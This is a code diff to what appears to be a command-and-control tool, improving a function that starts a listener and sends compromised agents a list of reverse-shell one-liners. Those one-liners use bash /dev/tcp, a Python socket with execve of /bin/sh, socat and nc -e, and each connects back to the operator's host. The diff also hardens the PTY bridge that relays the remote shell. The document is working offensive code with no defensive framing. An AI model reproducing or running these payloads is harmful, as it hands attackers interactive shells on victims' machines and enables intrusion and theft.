@@ -47,6 +47,7 @@ def _pty_bridge(conn):
 
     cols, rows = _terminal_size()
     pid, fd = pty.fork()
+
     if pid == 0:
         for f in (0, 1, 2):
             try:
@@ -61,7 +62,10 @@ def _pty_bridge(conn):
         os.execve("/bin/bash", ["/bin/bash"], os.environ)
         os._exit(1)
 
+    time.sleep(0.3)
     old = termios.tcgetattr(0)
+    conn.setblocking(True)
+
     try:
         tty.setraw(0)
         _set_winsize(fd, rows, cols)
@@ -71,7 +75,6 @@ def _pty_bridge(conn):
             _set_winsize(fd, r, c)
 
         signal.signal(signal.SIGWINCH, _sigwinch)
-        conn.setblocking(True)
 
         while True:
             r, _, _ = select.select([conn, fd, 0], [], [])
@@ -79,17 +82,29 @@ def _pty_bridge(conn):
                 d = conn.recv(4096)
                 if not d:
                     break
-                os.write(fd, d)
+                try:
+                    os.write(fd, d)
+                except OSError:
+                    break
             if fd in r:
-                d = os.read(fd, 4096)
+                try:
+                    d = os.read(fd, 4096)
+                except OSError:
+                    d = b""
                 if not d:
                     break
-                conn.send(d)
+                try:
+                    conn.send(d)
+                except OSError:
+                    break
             if 0 in r:
                 d = os.read(0, 4096)
                 if not d:
                     break
-                conn.send(d)
+                try:
+                    conn.send(d)
+                except OSError:
+                    break
     except (EOFError, BrokenPipeError, ConnectionResetError):
         pass
     except Exception as e:
@@ -135,10 +150,10 @@ def revshell(manager, agent_id, c2_server):
 
     _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{port}{Style.RESET_ALL}\n")
 
-    # Try multiple connect-back methods
+    # Try multiple connect-back methods (Python first — most reliable)
     payloads = [
-        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", "bash /dev/tcp"),
         (f"python3 -c \"import socket,os;s=socket.socket();s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", "python3"),
+        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", "bash /dev/tcp"),
         (f"echo 'import socket,os;s=socket.socket();s.connect((\"{LOCAL_IP}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve(\"/bin/sh\",[\"/bin/sh\",\"-i\"],os.environ)' | python3", "echo pipe python3"),
         (f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LOCAL_IP}:{port}", "socat"),
         (f"nc {LOCAL_IP} {port} -e /bin/sh 2>/dev/null || ncat {LOCAL_IP} {port} -e /bin/sh 2>/dev/null || nc.traditional -e /bin/sh {LOCAL_IP} {port} 2>/dev/null", "nc/ncat"),
